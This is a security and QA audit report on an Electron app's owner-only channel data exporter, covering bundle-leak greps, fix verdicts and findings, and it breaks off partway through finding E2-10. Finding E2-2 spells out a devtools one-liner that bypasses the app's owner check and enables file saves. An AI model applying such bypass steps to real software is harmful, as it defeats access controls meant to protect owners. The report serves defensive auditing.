# Run 2 — Area E: the owner-only channel data exporter and the owner gate

Scope: `server/channelRoutes.ts`, `server/csv.ts`, `server/resumeCache.ts`,
`src/lib/channel.ts`, `src/lib/ownerGate.ts`, `src/hooks/useChannelExport.ts`,
`src/components/ChannelExportPanel.tsx`, `src/context/ChannelExportContext.tsx`,
`electron/ownerCheck.cjs`, `electron/machineId.cjs`, `electron/exportSave.cjs`,
`electron/settingsStore.cjs`, `electron/main.cjs` (`export:save`, `owner:check`),
`scripts/build-server.cjs`, `vite.config.ts`.

**Counts: 0 blocker · 2 major · 12 minor · 1 polish (15 findings, E2-1 … E2-15).**
Nine are new (E2-1 … E2-9); six are run-1 findings that were never on the fix
list and still reproduce (E2-10 … E2-15). All 15 are `confirmed`, with one
reachability caveat stated in E2-4 and one half of E2-15 marked `likely`.

**Fix verdicts: E-2 HELD · E-3 HELD · E-5 HELD · E-7 HELD · E-4 HELD on the
server routes and on the owner build, REGRESSED on `export:save` · E-1 HELD for
the renderer and the server bundle, REGRESSED on screen and in `electron/*.cjs`.**

**No product code was changed.** `git status` shows only new files under
`audit/run-2/area-E/` and this file.

## How this was run

Everything below is the **production shape**: a real `vite build`, the real
`scripts/build-server.cjs`, the unmodified `electron/*.cjs`, the real Electron
main process and preload, a fresh `--user-data-dir` per launch, and a scripted
`yt-dlp`.

Builds are **frozen mirrors** under `/tmp/r2e-<shape>/`, built by
`audit/run-2/area-E/mirror.cjs`. Nothing in the repository is written: vite is
given `--outDir` inside the mirror and the server bundle goes straight there
through `BUILD_SERVER_OUT`. That matters this run — other areas rebuild the
repo's `dist/` and `electron/dist/server.cjs` while this one is in flight, and
run 1's area-E scripts built into the repo.

| shape | `VITE_ENABLE_CHANNEL_DATA` | `VITE_OWNER_MACHINES` |
|---|---|---|
| `public` | unset | — |
| `owner-star` | 1 | `*` |
| `owner-hash` | 1 | this machine's salted hash |
| `owner-other` | 1 | a hash for a different machine |

Salt: `run2-E-salt-4c7d` (mine, not run 1's). `/etc/machine-id` is
`02c0ff32d11f4f6ea20de4b2a2924cdc`, so this machine's hash is
`4162ead862cfec868a6a2de3413f29bd513928c8245b5db1aa96bb54b527baa2`; the
"different machine" hash is
`8c65e8b0619befdfe777203db30ee6508471387e4ebd330df9cc3958c8184c71`.

**The owner values are exported into the shell for every shape, the public one
included**, so a leak cannot hide behind an unset variable (this is the worst
case T10 used, reproduced independently).

Scripts: `audit/run-2/area-E/`. Captured output, screenshots and CSV bytes:
`audit/run-2/area-E/out/`.

| script | what it drives |
|---|---|
| `mirror.cjs` | builds a frozen shape |
| `stub.cjs` | my own scriptable `yt-dlp` (listing / metadata / comments / VTT, per-stage delays and failures, one JSON line per invocation in `argv.log`); ffmpeg and deno stay real |
| `e1-grep.cjs` | E-1: 12 brief needles + 57 more, across 5 surfaces × 4 shapes |
| `t1-owner-e2e.cjs` | an owner build runs an export end to end, twice (E-4's opposite failure mode, E-5) |
| `t2-gate.cjs` | E-4: 404 parity, forged keys, doctored `owner:check`, bridge override |
| `t3-exportsave-bypass.cjs` | `export:save` driven over IPC from a non-owner build and from a public build |
| `t4-e2-mechanisms.ts` | E-2: the prefix and `markInUse` each with the other defeated |
| `t5-e2-app.cjs` | E-2 in the running app; checkpoint deleted mid-run; progress after completion |
| `t6-e3-tabs.cjs` | E-3 through the real UI with two workspace tabs; two different exports side by side; cancel racing the 409 |
| `t7-resume.cjs` | resume after `SIGKILL` with the new prefix and holds; what the crashed run leaves behind |
| `t8-csv.ts` | E-7: both writers, byte parity, independent RFC 4180 round trip |
| `t9-csv-app.cjs` | E-7 through a real export with stranger-written comments and captions |
| `t10-public-dataname.cjs` | the v3 → v4 upgrade in a public build |
| `t11-edges.cjs` | the 409 lock's key, E-8/E-12/E-13/E-14 carry-overs, a vanished save folder |
| `t12-lock-release.cjs` | how long the duplicate-run lock is held after an abandoned request |
| `t13-resume-holes.cjs` | the resume path's dedupe key |
| `t14-startup.cjs` | T10's added startup owner check |

---

## Verdicts on the fixes

| fix | verdict | evidence |
|---|---|---|
| **E-1** the public bundle leak | **HELD for the renderer and the server bundle; REGRESSED elsewhere** — every one of the brief's needles is 0 in the public renderer, CSS, `index.html` and `server.cjs`, and 0 for 57 further needles. But the public build now puts the exporter's own folder name, `channel-data`, **on screen** (E2-1), and the fix added a new file, `electron/ownerCheck.cjs`, to the plain-`.cjs` set that ships in every shape (E2-7). | `out/e1-grep.txt`, `out/t10-public.json` |
| **E-4** the gate's server side | **HELD.** All three routes answer with Express's own 404 — same status, same `text/html`, same body shape as a route that does not exist, no `401`/`403`, no stack — on a non-allowlisted machine in an owner build *and* in a public build. Forged keys, a doctored list and a bridge override all fail. | `out/t2-owner-other.json`, `out/t2-public.json` |
| **E-4** an owner build still works | **HELD.** `owner-hash` and `owner-star` both show the entry, open the panel and complete an export end to end in the packaged shape, with the gate answering purely from the value `build-server.cjs` baked in (`ELECTRON_RESOURCES` is set before the server loads, so the `.env` fallback is never taken, and there is no `.env` in the repo or in the run's cwd). | `out/t1-owner-hash.json`, `out/t1-owner-star.json` |
| **E-4** `export:save` | **REGRESSED / not fixed.** The new guard is a boolean the page sets itself — see **E2-2**. | `out/t3-owner-other.json`, `out/t3-public.json` |
| **E-2** cache clear mid-export | **HELD, and both mechanisms hold independently.** | `out/t4-e2-mechanisms.json`, `out/t5-owner-hash.json` |
| **E-3** two simultaneous exports | **HELD through the real UI.** Two tabs, same request → the second is refused with a 409 and a clear sentence; the first finishes complete with zero duplicate rows. Two *different* exports run side by side and both are complete. | `out/t6-owner-hash.json` |
| **E-5** one folder per run | **HELD.** | `out/t1-owner-hash.json`, `out/t1-owner-star.json` |
| **E-7** CSV formula injection | **HELD, and the two writers are byte-identical.** | `out/t8-csv.json`, `out/csv-evidence/`, `out/csv-evidence-app/` |

No blocker survived. **E-2, E-3, E-5 and E-7 are clean.** The two fixes that did
not fully hold are E-1's non-renderer halves and E-4's `export:save` layer.

---

## E-1: the full public-vs-owner grep table

Five surfaces per shape, counted as `r/c/h/srv/el`:
`r` = `dist/assets/*.js`, `c` = `dist/assets/*.css`, `h` = `dist/index.html`,
`srv` = `electron/dist/server.cjs`, `el` = `electron/*.cjs`.

Source maps: `0` `.map` files in every `dist/assets`, `0` `sourceMappingURL` in
every surface, every shape.

### The needles run 2's brief names

| needle | public | owner-star | owner-hash | owner-other |
|---|---|---|---|---|
| `Channel data` | **0**/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 |
| `ui-channel-link` | **0**/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 |
| `Back to clipping` | **0**/0/0/0/0 | 1/0/0/0/0 | 1/0/0/0/0 | 1/0/0/0/0 |
| `api/channel/export` | **0**/0/0/**0**/0 | 3/0/0/4/0 | 3/0/0/4/0 | 3/0/0/4/0 |
| `Exported channel data` | **0**/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 |
| `channel-data` | **0**/0/0/**0**/**4** | 1/0/0/0/4 | 1/0/0/0/4 | 1/0/0/0/4 |
| `ui-channel-start` | **0**/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 |
| `ui-channel-stop` | **0**/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 | 2/0/0/0/0 |
| `VITE_OWNER` | **0**/0/0/**0**/0 | 0/0/0/4/0 | 0/0/0/4/0 | 0/0/0/4/0 |
| the salt `run2-E-salt-4c7d` | **0**/0/0/**0**/0 | 1/0/0/1/0 | 1/0/0/1/0 | 1/0/0/1/0 |
| this machine's hash | **0**/0/0/**0**/0 | 0/0/0/0/0 | 1/0/0/1/0 | 0/0/0/0/0 |
| the other machine's hash | **0**/0/0/**0**/0 | 0/0/0/0/0 | 0/0/0/0/0 | 1/0/0/1/0 |

Public is **0** for every one in the renderer and the server bundle. The only
non-zero public cell is `channel-data` ×4 in `electron/*.cjs`, which is E2-1 and
E2-7.

### Going further than run 1: 57 more needles

Everything below is **0 in the public renderer, CSS, `index.html` and
`server.cjs`** (owner counts for contrast where they are interesting):

`/api/channel/export` (owner 3/srv 4) · `api/channel/export/cancel` (1/1) ·
`api/channel/export/progress` (1/1) · `ytchanwip` (srv 1) · `ownerOnly` (srv 4) ·
`decideOwnerAccess` (srv 2) · `parseOwnerList` (srv 2) · `VITE_OWNER_MACHINES` ·
`VITE_OWNER_SALT` · `activeCheckpoints` · `CheckpointLostError` ·
`onScreen("channel")` · `screen==="channel"` · `channelAvailable` ·
`ChannelExportProvider` (r 1) · `ChannelExportContext` (r 1) ·
`useChannelExportContext` (r 1) · `useChannelExport` (r 1) · `ChannelExportPanel`
(0 everywhere — minified away) · `useOwnerAccess` · `checkOwnerAccess` ·
`isOwnerMachine` (r 1 / srv 4 in owner) · `ownerGate` · `__OWNER_MACHINES__` ·
`__OWNER_SALT__` · `__CHANNEL_DATA__` (0 in every shape — Vite folds them) ·
`hashMachineId` · `Channel profile exporter` (r 1) · `Export channel` ·
`What to export` · `Top 50 per video` · `youtube.com/@channelhandle` ·
`videos.csv` · `transcripts.csv` · `summary.csv` · `video-status.csv` ·
`subscriber_count` · `hashtags_in_title` · `includeTranscripts` ·
`includeVideoDetails` · `buildExportFolderName` · `-export-` (r 1) ·
`Export a channel` · `Start over (ignore saved progress)` ·
`every video on the channel` · `channel-panel` · `ui-channel` (r 6) ·
`help-anchor-channel`.

Four public hits need naming so they are not read as leaks and are not read as
clean either:

- `comments.csv` ×1 in the public renderer is the **per-video comment download**
  (`${title}-comments.csv`), a different feature. Not the exporter.
- `registerChannelRoutes` ×2 and `channelRoutes` ×4 in the public `server.cjs`
  are the empty stub, its `__esm` wrapper, its call site and the comment
  `// server/channelRoutes.stub.ts`. Designed shape, as run 1 recorded — but it
  does name a module (E2-7).
- `VITE_ENABLE_CHANNEL_DATA=` ×1 in the public `server.cjs` is
  `readChannelFlag`'s `.env` fallback, so `strings` on a public build prints a
  feature flag called `ENABLE_CHANNEL_DATA` (E2-7).
- `link-quiet` and `Everything` exist in every shape for unrelated controls.

Two full builds of the public shape produced a **byte-identical** renderer
(`index-D6lcmMXu.js` both times) and an identical leak verdict
(`out/e1-grep-rebuild.txt`), so none of this is build-order luck.

---

## Findings

### E2-1  The public build names the hidden feature on screen: an upgraded install shows a `channel-data` folder in the footer, its tooltip, the confirm popover and Settings
- **Severity**: major
- **Status**: confirmed
- **Steps**:
  1. `node audit/run-2/area-E/mirror.cjs public` (channel data off).
  2. Seed a **v3** install — the old key set from `audit/inventory.md`:
     `{"clipper.saveDir": "<dir>/clips", "clipper.saveDirs": ["<dir>/clips"]}`
     and nothing else.
  3. `xvfb-run -a node audit/run-2/area-E/t10-public-dataname.cjs public`
  4. Read `<userData>/settings.json`, hover the footer's Data chip, open it, and
     open Settings.
- **Expected**: a public build carries no trace of the exporter. `src/lib/campaigns.ts`
  says so in its own words: *"The exporter's own name only exists in a build that
  has the exporter; a public build must not carry it, so it falls back to a plain
  `data`."* T3 gated the renderer's `DATA_FOLDER_NAME` on `CHANNEL_DATA_BUILT` for
  exactly this reason.
- **Actual**: the **main process** has its own ungated copy of the rule.
  `electron/settingsStore.cjs:15-22` is

  ```js
  /** "/a/b/clips" -> "/a/b/channel-data". Same rule as defaultDataDir in src/lib/campaigns.ts. */
  function siblingDataDir(clipsDir) {
    …
    if (cut < 0) return "channel-data";
    return `${trimmed.slice(0, cut)}${sep}channel-data`;
  }
  ```

  It is plain CommonJS, shipped verbatim by `package.json`'s
  `build.files: ["electron/**/*", …]`, and `migrateSettings` calls it on the v3 → v4
  upgrade in every shape. In the **public** build:

  ```
  settings.json written by main:
    "clipper.dataDir":          "/tmp/r2e-v3home-Mw2C2b/channel-data"
    "clipper.dataDirConfirmed": false
  footer chip text            : "Data | channel-data | Confirm"
  footer chip title           : "Data folder: /tmp/…/channel-data. Confirm or choose another."
  confirm popover             : "/tmp/…/channel-data"
  Settings panel              : contains "channel-data"
  document.body.innerText     : /channel-data/ -> true
  ```

  `dataDirConfirmed: false` makes it *more* visible, not less: the chip grows a
  red "Confirm" and the popover shows the full path, so the first thing an
  upgraded public user is asked to do is confirm a folder named after a feature
  they are not supposed to know exists. No devtools, no `strings`, no minified
  bundle — it is in the window chrome.
- **Why major, stated plainly**: nothing is blocked and no data is lost, which is
  why slice 4 put the *bundle-string* half of E-1 at minor. This instance is worse
  in the one dimension the owner's requirement is about — it needs no tooling at
  all and it is in every upgraded public install — and the area's own standard this
  run is "a single survivor fails the requirement". Judged purely job-centrically
  it would be minor; judged against the requirement it is the clearest failure in
  the area.
- **Proof**: `audit/run-2/area-E/out/t10-public.json`,
  `out/t10-public/01-01-footer-after-v3-upgrade.png`,
  `out/t10-public/02-02-data-folder-popover.png`,
  `out/t10-public/03-03-settings-panel.png`,
  `out/e1-grep.txt` (`channel-data`, public, `el` column = 4)
- **Suspected file**: `electron/settingsStore.cjs` (`siblingDataDir`, and the
  doc comment at line 29)

### E2-2  `export:save`'s new owner check is a boolean the page sets itself: one line of script turns it on, in a non-owner build and in a public build
- **Severity**: major
- **Status**: confirmed
- **Steps**:
  1. `node audit/run-2/area-E/mirror.cjs owner-other` (feature compiled in, the
     allowlist holds another machine's hash) and `public`.
  2. `xvfb-run -a node audit/run-2/area-E/t3-exportsave-bypass.cjs owner-other`
     then `… public`.
  3. Each case plants its own `/tmp/ytchan-<rand>/videos.csv` — the exact shape
     `electron/exportSave.cjs` insists on — then, from the page:
     `await window.electronAPI.isOwnerMachine(["*"], "")` followed immediately by
     `window.electronAPI.saveExport({dirPath, folder, files})`.
- **Expected**: T10 item 2's own words — `export:save` "returns
  `{ok:false, error:"Could not save."}` (no hint the feature exists) unless
  `isOwner()`", and `audit/inventory.md` requires both layers to hold "because
  either alone is bypassable by anyone who can open devtools". A renderer must not
  be able to decide the answer.
- **Actual**: `electron/ownerCheck.cjs`'s `check(list, salt)` **remembers** the
  verdict of the last call, and both the list and the salt come from the renderer:

  ```js
  async check(list, salt) {
    try { verdict = (await compute(list, salt)) === true; } catch { verdict = false; }
    return verdict;
  },
  isOwner: () => verdict === true,
  ```

  `compute` returns `true` for a list containing `"*"` before it looks at the salt
  or the machine id. So the page sets the verdict. Measured, in order, on
  **`owner-other`** (the UI is hidden the whole time — `navHasChannelLink: false`):

  ```
  A  save with no check yet                      -> {ok:false,"Could not save."}   (fails closed, correct)
  B  isOwnerMachine(["*"], "")  -> true
     saveExport                                  -> {ok:true, path:"…/B-star"}     <- planted file moved
  C  isOwnerMachine([this machine's hash], salt) -> true     (the E-6 oracle)
     saveExport                                  -> {ok:true, path:"…/C-oracle"}
  D  isOwnerMachine([a wrong hash], salt)        -> false
     saveExport                                  -> {ok:false,"Could not save."}   (so the flip is per-call)
  main.log: [export] saved 1 file(s) to …/B-star
            [export] saved 1 file(s) to …/C-oracle
  ```

  On the **public** build — where `owner:check` is registered anyway and the
  renderer never calls it — the same two cases succeed, **and the flipped verdict
  survives a renderer reload** (`E: {ok:true, path:"…/E-afterReload"}`), because
  `checkOwnerAccess()` returns early on `!CHANNEL_DATA_BUILT` and so nothing ever
  sets the verdict back. One call, once, and the guard is off for the life of the
  process.

  **What this does not give**, so the severity is not inflated: the three HTTP
  routes still answer 404 after the flip (`routesAfterStar` in
  `out/t2-owner-other.json`), so no channel data can be produced; the destination
  is still confined to `saveRoots()`; the source is still confined to a file
  sitting directly inside a `/tmp/ytchan-*` folder (a `ytchanwip-` checkpoint is
  correctly refused with "Unexpected export location"). So the harm is that the
  new layer adds nothing against the attacker it was written for — the friend with
  devtools in `audit/run-1/report.md`'s story S12 — and that the refusal's careful
  "no hint the feature exists" wording is undone by an IPC channel that cheerfully
  confirms an owner gate exists.
- **Proof**: `audit/run-2/area-E/out/t3-owner-other.json`,
  `out/t3-public.json`, `out/t2-owner-other.json` (`attack4`, `routesAfterStar`),
  `out/t2-public.json` (`attack4`),
  `out/t3-owner-other/01-01-after-bypass-attempts.png`
- **Suspected file**: `electron/ownerCheck.cjs` (the remembered `verdict` is
  computed from caller-supplied input), `electron/main.cjs:783` (`owner:check`
  registered unconditionally), `electron/main.cjs:607`

### E2-3  A crashed or stopped export's working folder can no longer be reclaimed from the UI, and its disk is no longer even reported
- **Severity**: minor
- **Status**: confirmed
- **Steps**:
  1. Owner build. Start an export of 10 videos with all three parts and a slow
     comment stage.
  2. At "Comments and transcripts, video 4 of 10", `SIGKILL` the app.
  3. Relaunch and, before anything else, `GET /api/cache/usage` and
     `POST /api/cache/clear` (what Settings → "Clear unfinished" calls).
- **Expected**: the user can see and reclaim the space an abandoned export left
  behind, which is what run 1's E-14 and T10 item 11 are both about.
- **Actual**: the checkpoint survives the kill intact — which is the good half,
  and resume works (below) — but it is now invisible to both disk tools, because
  `CHECKPOINT_PREFIX = "ytchanwip-"` is deliberately not matched by
  `resumeCache.cacheDirs()`:

  ```
  orphaned checkpoint on disk : /tmp/ytchanwip-d65cb4decd6460c9  14,304 bytes
                                comments.jsonl 3  metadata.jsonl 20
                                selection.json 1  statuses.jsonl 3  transcripts.jsonl 6
  GET  /api/cache/usage       : {"folders":3,"bytes":12966,"protectedFolders":0}   <- the 14,304 is not in it
  POST /api/cache/clear       : {"ok":true,"removed":3,"skipped":0,…}
  the checkpoint afterwards   : still there, byte for byte
  ```

  The only thing that ever removes it is `sweepStaleCheckpoints()` in
  `channelRoutes.ts` — a **7-day** cutoff, run from `registerChannelRoutes`, i.e.
  only in an owner build and only at server start. `resumeCache.sweepStaleCache()`
  cannot see the prefix either (`out/t4-e2-mechanisms.json`, `stale_sweep`:
  `wipSurvived: true`). Every cancelled run leaves one too: `t12` left three
  behind. 14 KB here is a 10-video stub; the same folder on the whole-channel run
  the feature exists for is `metadata.jsonl` plus millions of caption lines, and
  the user is told they have 0 B to reclaim. Before T7's fix this folder was
  reclaimable — too reclaimable, which was E-2 — so this is the other side of that
  fix, not a new mechanism.
- **Proof**: `audit/run-2/area-E/out/t7-owner-hash.json` (`afterKill`,
  `diskTools`), `out/t4-e2-mechanisms.json` (`stale_sweep`, `prefix_alone`),
  `out/t12-owner-hash.json` (`wipAfter`)
- **Suspected file**: `server/channelRoutes.ts` (`CHECKPOINT_PREFIX`,
  `sweepStaleCheckpoints`), `server/resumeCache.ts` (`cacheDirs`, `cacheUsage`)

### E2-4  A resumed run loses its "already collected" key if only `selection.json` is lost, and then duplicates every row it already had — reported as a clean success
- **Severity**: minor
- **Status**: confirmed (the behaviour; see the reachability note)
- **Steps**:
  1. Owner build. `xvfb-run -a node audit/run-2/area-E/t13-resume-holes.cjs owner-hash`
  2. The script runs an export, cancels it once `statuses.jsonl` holds 3 videos,
     then removes exactly one file from the checkpoint and re-runs the identical
     request: `selection.json` (case A), `statuses.jsonl` (B), `comments.jsonl` (C).
- **Expected**: the E-2 guard — *"A resumed checkpoint with a missing live file is
  discarded instead of resumed into a hole"* — covers a checkpoint that has lost a
  file, whichever file it is. A resumed run must never duplicate rows.
- **Actual**: the guard is `if (saved && liveFiles.some((f) => !fs.existsSync(f)))`,
  and `liveFiles` is `statuses.jsonl` plus the two requested row files — not
  `selection.json`. When the selection is the file that is gone, `saved` is simply
  `null`, the whole `if (saved …)` branch is skipped, and that branch is **the only
  place `statuses` is loaded** (`statuses.push(...readJsonl(ckStatuses))`). So
  `alreadyDone` is empty, every video is collected again, and `appendCheckpoint`
  appends to a `comments.jsonl` that already holds three videos' rows:

  ```
  A  removed selection.json (comments 3, metadata 20, statuses 3, transcripts 6 left)
     resumed -> 200, counts {videos:10, comments:13, transcripts:26}
     comments.csv    13 rows, 3 duplicate rows   vid0 ×2  vid1 ×2  vid2 ×2  rest ×1
     transcripts.csv 26 rows, 6 duplicate rows   vid0 ×4  vid1 ×4  vid2 ×4  rest ×2
     summary.csv     exported=10, cancelled=false     <- no sign anything is doubled

  B  removed statuses.jsonl  -> guard fires, 10 / 10 / 20, 0 duplicates   (correct)
  C  removed comments.jsonl  -> guard fires, 10 / 10 / 20, 0 duplicates   (correct)
  ```

  Cases B and C are the control: the guard does work for the files it lists, so
  this is a gap in the list, not a broken guard.
- **Reachability, honestly**: I could not reach case A from any product action.
  `clearCache` can no longer see the folder (E2-3), `clearCheckpoint` and
  "Start over" remove the whole directory, and `selection.json` is always written
  before the first comment is collected, so a crash cannot leave rows without a
  selection. The one plausible real trigger is **per-file** temp aging —
  `systemd-tmpfiles` ages files in `/tmp` individually, and `selection.json` is
  written once at the start while the `.jsonl` files are appended throughout, so on
  a multi-day whole-channel run the selection is the oldest file in the folder.
  That is a mechanism, not something I measured. Filed minor on that basis; the
  fix is one line (load `statuses` regardless of `saved`, or put `selection.json`
  in `liveFiles`).
- **Proof**: `audit/run-2/area-E/out/t13-owner-hash.json`
  (`A_selection_removed`, `B_statuses_removed`, `C_comments_removed`)
- **Suspected file**: `server/channelRoutes.ts` (`liveFiles`, and the
  `statuses.push(...readJsonl(ckStatuses))` inside `if (saved …)`)

### E2-5  A finished export's CSVs sit unprotected in the temp dir until the renderer moves them, so "Clear unfinished" in that window destroys the run
- **Severity**: minor
- **Status**: confirmed
- **Steps**:
  1. `node_modules/.bin/tsx audit/run-2/area-E/t4-e2-mechanisms.ts` — section
     `finished_output_folder` creates a `/tmp/ytchan-<rand>/` holding 2 KB of
     finished CSVs, asks `cacheUsage()` about it, then runs the real `clearCache()`.
  2. `xvfb-run -a node audit/run-2/area-E/t11-edges.cjs owner-hash` — section `E`
     runs a real `deliver:"path"` export and never calls `export:save`.
- **Expected**: the same protection `clip:save` gets. `resumeCache.ts` says it in
  its own header: a folder is in use "for a grace period after a finished clip has
  been handed to the app (the clip's only copy lives there until the main process
  moves it)", and the clip route calls `holdFolder()`. The exporter's output is the
  same situation with hours of collection in it instead of one clip.
- **Actual**: `buildResponse` does `fs.mkdtempSync(path.join(os.tmpdir(), EXPORT_PREFIX))`
  — the swept prefix — and never calls `markInUse` or `holdFolder`:

  ```
  module level: usage {"folders":1,"bytes":2000,"protectedFolders":0}
                clearCache() {"removed":1,"skipped":0}   -> the finished CSVs are gone
  in the app  : 10 orphaned /tmp/ytchan-* output folders after direct runs
                GET /api/cache/usage {"folders":10,"bytes":41134,"protectedFolders":0}
  ```

  Through the UI the window between the 200 and `saveExport`'s rename is
  milliseconds, so this is narrow; it widens to the length of a cross-device copy
  (`EXDEV` → `copyFile`) for a large export, and it is wide open for the
  `deliver:"path"` call that is never collected, which is also run 1's E-14 and
  still reproduces unchanged.
- **Proof**: `audit/run-2/area-E/out/t4-e2-mechanisms.json`
  (`finished_output_folder`), `out/t11-owner-hash.json` (`E`)
- **Suspected file**: `server/channelRoutes.ts` (`buildResponse`'s `outDir`),
  `server/resumeCache.ts` (`holdFolder`, unused by the exporter)

### E2-6  `export:save` recreates a destination folder that has gone, so an export aimed at an unmounted drive is written to a new local folder with the same path
- **Severity**: minor
- **Status**: confirmed
- **Steps**:
  1. Owner build. Point `clipper.dataDir` at a folder, run an export with
     `deliver:"path"`, then delete that folder before calling `export:save`.
  2. `xvfb-run -a node audit/run-2/area-E/t11-edges.cjs owner-hash`, section `F`.
- **Expected**: a save into a folder that no longer exists is refused and says so.
  The user chose a folder; a different folder that happens to have the same path is
  not it.
- **Actual**: `saveExportFiles` resolves the target and then does
  `await fsp.mkdir(target, { recursive: true })`, which recreates every missing
  parent:

  ```
  dataDir set to            : /tmp/r2e-t11-gone-JjVV1v
  folder deleted            : yes
  saveExport                : {"ok":true,"path":"/tmp/r2e-t11-gone-JjVV1v/t11-F"}
  the folder now holds      : ["t11-F"]
  the temp folder           : removed, so the CSVs' only copy is in the new folder
  ```

  On a real machine the folder a user picks for research data is often an external
  or network drive. Unmounted, `/Volumes/Archive` or `/mnt/data` is an ordinary
  empty path, and the export is written into a new local directory that shadows
  the mount point; the next mount hides it. The run reports "Export saved" with a
  "Show folder" button that opens the shadow. `electron/pathSafety.cjs`'s
  `resolveTarget` is doing its job (containment) — the missing check is existence.
  The same `mkdir({recursive:true})` pattern is in the clip save path, so a fix
  probably belongs in `pathSafety.cjs`.
- **Proof**: `audit/run-2/area-E/out/t11-owner-hash.json` (`F`)
- **Suspected file**: `electron/exportSave.cjs` (`fsp.mkdir(target, {recursive:true})`),
  `electron/pathSafety.cjs` (`resolveTarget`)

### E2-7  The public build still ships the owner gate as readable source, and the fix added a file to it
- **Severity**: minor
- **Status**: confirmed
- **Steps**:
  1. `node audit/run-2/area-E/mirror.cjs public`
  2. `node audit/run-2/area-E/e1-grep.cjs` and read the `electron/*.cjs` section.
  3. `strings /tmp/r2e-public/electron/dist/server.cjs | grep CHANNEL`
- **Expected**: run 1's E-1 asked for the `electron/*.cjs` half to stop shipping
  the gate in a public build. The brief for this run names "the preload surface,
  `machineId`, `owner:check`" as things to hunt.
- **Actual**: unchanged, and larger. `package.json`'s
  `build.files: ["electron/**/*","dist/**/*","package.json","!**/*.map","!**/*.ts"]`
  ships all 17 `.cjs` files in every shape, and the T10 fix **added a new one**:

  ```
  ownerCheck.cjs:2:  // The main process's half of the owner gate. `check(list, salt)` answers the
  ownerCheck.cjs:3:  // renderer's owner:check question and REMEMBERS the verdict here, so other
  ownerCheck.cjs:4:  // handlers (export:save) can ask `isOwner()` without ever being handed the raw
  exportSave.cjs:4:  * Description: Moves a finished channel export out of the engine's temp
  machineId.cjs:3:   // main process (to answer "is this an owner machine") and by
  main.cjs:598:      // Moves a finished channel export out of the engine's temp dir, …
  main.cjs:778:      // Owner gate: is this computer on the build's allowlist? …
  main.cjs:783:      ipcMain.handle("owner:check", (_e, list, salt) => ownerGate.check(list, salt));
  preload.cjs:46:    // Moves the channel exporter's CSVs out of the engine's temp dir. …
  preload.cjs:70:    isOwnerMachine: (list, salt) => ipcRenderer.invoke("owner:check", list, salt),
  settingsStore.cjs:15,20,21,29: channel-data   (that is E2-1)
  ```

  Counts in the public build's `electron/*.cjs`: `owner:check` 3, `ownerGate` 6,
  `hashMachineId` 6, `machineId` 2, `export:save` 4, `saveExport` 5,
  `isOwnerMachine` 1, `channel-data` 4.

  The public **server bundle** adds two more: the literal
  `"VITE_ENABLE_CHANNEL_DATA="` from `readChannelFlag`'s `.env` fallback, and
  `// server/channelRoutes.stub.ts` with `registerChannelRoutes(_app, _deps) {}`.
  So `strings` on a shipped public build prints a feature flag called
  `ENABLE_CHANNEL_DATA` and a module called `channelRoutes`.

  Run 1 argued this half from the `build.files` globs; so do I — no `.dmg`/`.exe`/
  `.AppImage` was built, so the packaged artefact is **not provable here**. What is
  proven is the file contents and the glob.
- **Proof**: `audit/run-2/area-E/out/e1-grep.txt` (the `electron/*.cjs` section and
  the quoted lines), `out/e1-grep.json`
- **Suspected file**: `package.json` (`build.files`), `electron/ownerCheck.cjs`,
  `electron/preload.cjs`, `electron/machineId.cjs`, `electron/main.cjs`,
  `server/index.ts` (`readChannelFlag`'s `.env` fallback)

### E2-8  `video-status.csv` is header-only for a video-details-only run, while the UI calls it one of the two files that say what the run did
- **Severity**: minor
- **Status**: confirmed
- **Steps**:
  1. Owner build. `POST /api/channel/export` with `includeComments:false`,
     `includeTranscripts:false`, `limit:16`, `deliver:"path"`.
  2. Read the three files it writes.
- **Expected**: `summary.csv` and `video-status.csv` are "always written… They are
  a few kilobytes and show what the run did" (the panel's own words), and
  "Videos with comments off or no captions are listed in video-status.csv".
- **Actual**: the per-video loop is entered only
  `if (input.includeComments || input.includeTranscripts)`, and `statuses` is
  filled inside it, so a details-only run never writes a status row:

  ```
  counts        : {"videos":16,"comments":0,"transcripts":0}   exported: 16
  videos.csv    : 3,895 bytes, 16 rows
  summary.csv   :   237 bytes,  1 row   (exported=16, included="video details")
  video-status.csv:  30 bytes,  0 rows  <- header and BOM only
  ```

  The folder therefore contains a 30-byte receipt that lists none of the 16 videos
  it exported. Nothing is lost — `videos.csv` has every row — but one of the two
  files the UI points at as the run's record is empty by construction, and the
  reader cannot tell that from "there were no problems".
- **Proof**: `audit/run-2/area-E/out/t11-owner-hash.json` (`G`),
  `out/t5-owner-hash.json` (`phase3.exportWithKnownJob`, same shape)
- **Suspected file**: `server/channelRoutes.ts` (the
  `if (input.includeComments || input.includeTranscripts)` guard around the status
  rows)

### E2-9  A channel name's punctuation and emoji go straight into the export folder name
- **Severity**: polish
- **Status**: confirmed
- **Steps**: owner build, stub channel name `Evil, "Channel" 🎬`, export, list the
  data folder.
- **Expected**: a folder name a person can type, quote in a shell and paste into a
  spreadsheet pipeline.
- **Actual**: `Evil, Channel 🎬-export-2026-11-21-211104-60no`. `sanitizeFilename`
  removes the dangerous characters correctly — `\ / : * ? " < > |` and controls are
  all gone, leading/trailing dots are stripped, and `resolveTarget` then replaces
  any separator and enforces containment, so there is **no traversal here** (I
  looked for one) — but a comma and an emoji survive into a directory name that
  the owner will be handling from a terminal and from scripts. Cosmetic, listed
  because the channel title is third-party text.
- **Proof**: `audit/run-2/area-E/out/t9-owner-hash.json` (`folders`),
  `out/csv-evidence-app/`
- **Suspected file**: `src/lib/clip.ts` (`sanitizeFilename`),
  `src/lib/channel.ts` (`buildExportFolderName`)

---

## Run 1 findings that were not on the fix list and still reproduce

Each was re-driven against the fixed tree with the script named under it. None
is a regression; they are recorded with run-2 ids so they stay tracked.

These six use a compact form on purpose: the **Steps** and **Expected** are
unchanged from the run-1 finding named in each title (`audit/run-1/areas/E-channel-owner.md`),
so only what I measured this run, the proof and the file are repeated. `File:` is
the **Suspected file** field.

### E2-10  E-8 still reproduces: a cancel that lands before the POST turns that export into a silent empty success
- **Severity**: minor · **Status**: confirmed
- `GET /progress?jobId=J` (which is what `startExport` does before it POSTs) →
  `POST /cancel {jobId:J}` → `POST /export?jobId=J`:
  ```
  sse      : open
  cancel   : 200 {"ok":true}
